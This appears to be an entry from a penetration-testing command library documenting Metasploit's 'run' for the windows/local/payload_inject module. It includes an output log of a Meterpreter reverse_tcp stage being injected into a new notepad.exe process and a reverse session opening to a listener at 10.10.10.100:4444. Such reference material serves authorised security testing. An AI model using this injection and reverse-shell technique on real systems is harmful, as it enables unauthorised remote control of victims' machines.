---
id: 8fb6186d-4b5a-4e9e-a1a0-0df0e9a27c27-part3
name: metasploit-run-payload-inject
type: command
executor: metasploit
data: run
output: >-
  msf6 exploit(windows/local/payload_inject) > run


  [*] Started reverse TCP handler on 10.10.10.100:4444 

  [*] Running module against DESKTOP-BKRO34Q

  [-] PID  does not actually exist.

  [*] Launching notepad.exe...

  [*] Preparing 'windows/meterpreter/reverse_tcp' for PID 7500

  [*] Sending stage (179779 bytes) to 10.10.10.10

  [*] Meterpreter session 3 opened (10.10.10.100:4444 -> 10.10.10.10:50223) at
  2019-11-13 19:36:41 -0500
created_at: '2019-11-14T01:00:13.488117+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - metasploit
  - payload-injection
verified: true
validated: true
---

# Metasploit Run Payload Inject

## Command

```metasploit
run
```

## Description

Executes the loaded payload_inject module to inject a 64-bit Meterpreter payload into a new process on the target, upgrading from a 32-bit session and opening a new reverse connection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| None | Runs with current module options (e.g., session, LHOST) | No |

## Examples

### Basic Usage

```metasploit
run
```

Triggers injection after setting session and payload options.

### Advanced Usage

`run -j` to run in background for non-blocking execution.

## Expected Output

```
msf6 exploit(windows/local/payload_inject) > run

[*] Started reverse TCP handler on 10.10.10.100:4444 
[*] Running module against DESKTOP-BKRO34Q
[-] PID  does not actually exist.
[*] Launching notepad.exe...
[*] Preparing 'windows/meterpreter/reverse_tcp' for PID 7500
[*] Sending stage (179779 bytes) to 10.10.10.10
[*] Meterpreter session 3 opened (10.10.10.100:4444 -> 10.10.10.10:50223) at 2019-11-13 19:36:41 -0500
```

A new 64-bit session (e.g., 3) is created; interact with `sessions -i 3`.

## Related

- [[commands/metasploit-set-session-id]]
- [[procedures/upgrade-windows-meterpreter-x32-to-x64]]
